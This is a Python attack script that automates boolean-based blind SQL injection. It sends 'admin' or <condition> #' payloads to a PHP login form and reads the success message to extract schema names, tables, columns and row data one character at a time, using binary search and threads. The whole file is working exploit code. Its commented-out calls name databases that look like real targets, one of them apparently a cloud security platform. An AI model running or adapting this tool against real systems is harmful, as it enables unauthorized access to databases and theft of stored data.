# -*- coding: utf-8 -*-
import sys
import time
import requests
import threading
import warnings

warnings.filterwarnings("ignore")

#https://www.cnblogs.com/ddzzhh/p/6773740.html
symbol1 = [31, 47]
number = [48, 57] #0-9
symbol2 = [58, 64]
AtoZ = [65, 90]
symbol3 = [91, 96]
atoz = [97, 122]
symbol4 = [123, 126]


class general_thread(threading.Thread):
	def __init__(self, func, args):
		super(general_thread, self).__init__()
		self.result = ""
		self.status = 1
		self.func = func
		self.args = args
	def run(self):
		data = self.func(self.args[0],self.args[1],self.args[2])
		self.result = data
		self.status = 2
def get_str_range():
	str_range = {}
	tmp_range = []
	tmp_range.append(atoz)
	tmp_range.append(AtoZ)
	tmp_range.append(number)
	more = "_$#-{}()'+[]:/\\,@."
	str_range['range'] = tmp_range
	str_range['str'] = more
	total_range = []
	for t in tmp_range:
		total_range += [x for x in range(t[0],t[1]+1)]
	for s in more:
		total_range.append(ord(s))
	total_range.sort()
	return total_range
def req(payload):
	url = "http://127.0.0.1:3333/index.php"
	data = "username=admin&password=admin' or "+str(payload)+" #"
	# print(data)
	headers = {
	"Content-Type" : "application/x-www-form-urlencoded"
	}
	proxies = {
		"http": "http://127.0.0.1:8080",
		"https": "http://127.0.0.1:8080",
	}
	r = requests.post(url = url, proxies = proxies, headers = headers, data = data)
	resContent = r.content
	if "登录成功" in resContent.decode('utf-8'):
		return 1
	else:
		return 2
	return 3#network error
#dbname
def generate_str(myrange = [97,122]):
	result = ""
	for i in range(myrange[0], myrange[1]+1):
		result += chr(i)
	return result

def general_count(sql):
	step = 3
	pos = -1
	for i in range(0, 10000, step):
		payload = sql.format(i)
		status = req(payload)
		if status == 1:
			continue
			#true
		elif status == 2:
			pos = i
			break
			#false
	if step == 1:
		db_len = i
	else:
		for i in range(pos-step+1, pos+1):
			payload = sql.format(i)
			status = req(payload)
			if status == 1:
				continue
				#true
			elif status == 2:
				pos = i
				break
	return pos
def general_getstrs(tsql, length):
	pos = -1
	step = 12
	strchr = -1
	result = ""
	my_str_range = get_str_range()
	for i in range(1, length + 1):
		for m in range(0, len(my_str_range) + step, step):
			try:
				j = my_str_range[m]
			except:
				pos = m
				break
			payload = tsql.format(i, j)
			status = req(payload)
			if status == 1:
				continue
				#true
			elif status == 2:
				pos = m
				break
		if step == 1:
			strchr = pos
		else:
			for m in range(pos - step, pos+1):
				j = my_str_range[m]
				payload = tsql.format(i, j)
				status = req(payload)
				if status == 1:
					continue
				elif status == 2:
					strchr = m
					break
		result += chr(my_str_range[strchr])
		print(result)
		getDelay()
	print(length)
	return result
def get_mid(x,y):
	#二分法爆破，提高效率
	result = []
	t = -1
	if (x+y)%2 != 0:
		if (y-x) == 1:
			return False
		t = (x+y+1)//2
	else:
		t = (x+y)//2
	return t
def general_getstr(tsql, length):
	pos = -1
	step = 12
	strchr = -1
	result = ""
	my_str_range = get_str_range()
	for i in range(1, length + 1):
		pos = -1
		x = 0
		y = len(my_str_range)
		while pos == -1:
			z = get_mid(x,y)
			if z == False:
				pos = y
				break
			j = my_str_range[z]
			payload = tsql.format(i, j)
			status = req(payload)
			if status == 1:
				x = z

				#true
			elif status == 2:
				y = z
		try:
			result += chr(my_str_range[pos])
		except Exception as e:
			result += "${特殊字符}"
			print(e)
			print("eee")
		print(result)
		# getDelay()
	print(length)
	return result
# def get_str_range():
# 	str_list = generate_str(atoz) + generate_str(AtoZ) + "_"
# 	return str_list

def get_dbs():
	str_range = ""
	sql1 = "(select count(*) from information_schema.SCHEMATA) > {}"
	db_len = general_count(sql1)
	db_list = []
	for i in range(0, db_len):
		db_name = get_dbname(i)
		db_list.append(db_name)
		print(db_name)
	return db_list


def get_tables(db_name):
	get_tb_len_sql = "(select count(*) from information_schema.TABLES where TABLE_SCHEMA = '"+str(db_name)+"' ) > {}"
	tb_len = general_count(get_tb_len_sql)
	tb_list = []
	for j in range(0, tb_len):
		tb_name = get_tbname(db_name, j)
		tb_list.append(tb_name)
	return tb_list

def get_columns(db_name, tb_name):
	get_col_len_sql = "(select count(*) from information_schema.COLUMNS where TABLE_SCHEMA = '"+str(db_name)+"' and TABLE_NAME = '"+str(tb_name)+"' ) > {}"
	col_len = general_count(get_col_len_sql)
	col_list = []
	for j in range(0, col_len):
		col_name = get_colname(db_name, tb_name, j)
		col_list.append(col_name)
	return col_list

def mget_columns(db_name, tb_name):
	get_col_len_sql = "(select count(*) from information_schema.COLUMNS where TABLE_SCHEMA = '"+str(db_name)+"' and TABLE_NAME = '"+str(tb_name)+"' ) > {}"
	col_len = general_count(get_col_len_sql)
	col_list = []
	tasks = []
	for j in range(0, col_len):
		task = general_thread(get_colname, args = (db_name, tb_name, j))
		tasks.append(task)
		task.start()
	for task in tasks:
		task.join()
	for task in tasks:
		col_list.append(task.result)
		# col_name = get_colname(db_name, tb_name, j)
		# col_list.append(col_name)
	return col_list

def get_datas(db_name, tb_name, column, where = "1=1"):
	get_log_len_sql = "(select count(*) from "+db_name+"."+tb_name+" where "+where+") > {}"
	#条件
	log_len = general_count(get_log_len_sql)
	log_list = []
	for j in range(0, log_len):
		log_data = get_data(db_name, tb_name, column, j, where)
		log_list.append(log_data)
	return log_list

def get_log_with_column(db_name, tb_name, column, where = "1=1", index = 1):
	get_log_len_sql = "(select count(*) from "+db_name+"."+tb_name+" where "+where+") > {}"
	#条件
	result = ""
	result = get_data(db_name, tb_name, column, index, where)
	return result

def mget_log(db_name, tb_name, where = "1=1", index = 1):
	get_log_len_sql = "(select count(*) from "+db_name+"."+tb_name+" where "+where+") > {}"
	#条件
	columns = mget_columns(db_name, tb_name)
	print(columns)
	result = ""
	for column in columns:
		value = get_data(db_name, tb_name, column, index, where)
		result += column + ":" + value + "\r\n"
	return result

def get_log(db_name, tb_name, where = "1=1", index = 1):
	get_log_len_sql = "(select count(*) from "+db_name+"."+tb_name+" where "+where+") > {}"
	#条件
	columns = get_columns(db_name, tb_name)
	print(columns)
	result = ""
	for column in columns:
		value = get_data(db_name, tb_name, column, index, where)
		result += column + ":" + value + "\r\n"
	return result

def getDelay():
	global stime
	now = time.time()
	print(now-stime)

def get_dbname(index):
	sql = "(select length(SCHEMA_NAME) from information_schema.SCHEMATA limit "+str(index)+",1) > {}"
	dbname_len = general_count(sql)
	sql = "(select ord(substring(SCHEMA_NAME, {}, 1)) from information_schema.SCHEMATA limit "+str(index)+",1) > {}"
	return general_getstr(sql, dbname_len)

def get_tbname(db_name, index):
	sql = "(select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = '"+str(db_name)+"' limit "+str(index)+",1) > {}"
	dbname_len = general_count(sql)
	sql = "(select ord(substring(TABLE_NAME, {}, 1)) from information_schema.TABLES where TABLE_SCHEMA = '"+str(db_name)+"' limit "+str(index)+",1) > {}"
	return general_getstr(sql, dbname_len)

def get_colname(db_name, tb_name, index):
	sql = "(select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = '"+str(db_name)+"' and TABLE_NAME = '"+str(tb_name)+"' limit "+str(index)+",1) > {}"
	colname_len = general_count(sql)
	sql = "(select ord(substring(COLUMN_NAME, {}, 1)) from information_schema.COLUMNS where TABLE_SCHEMA = '"+str(db_name)+"' and TABLE_NAME = '"+str(tb_name)+"' limit "+str(index)+",1) > {}"
	return general_getstr(sql, colname_len)

def get_data(db_name, tb_name, column, index, where = "1=1"):
	sql = "(select length("+column+") from "+db_name+"."+tb_name+" where "+where+" limit "+str(index)+",1) > {}"
	colname_len = general_count(sql)
	sql = "(select ord(substring("+column+", {}, 1)) from "+db_name+"."+tb_name+" where "+where+" limit "+str(index)+",1) > {}"
	print(sql)
	return general_getstr(sql, colname_len)
global stime
stime = time.time()
#35.181718111
# print(get_dbs())
print(get_tables("testdb"))
print(get_columns("testdb", "user"))
#select substring(appname, 3, 1) from aliyun_sec_platform.white_task where 1=1 limit 1,1;
# get_tables("evilAngel")
# get_columns("evilAngel","evilAngel_pentest_result")
# get_datas("aliyun_sec_platform", "white_task", "app_namespace")
#print get_log_with_column("aliyun_sec_platform", "white_task", "user()", "1=1", 1)
# print(mget_log("aliyun_sec_platform", "white_task",  "1=1", 1))
# print get_dbname(1)
# print (get_str_range())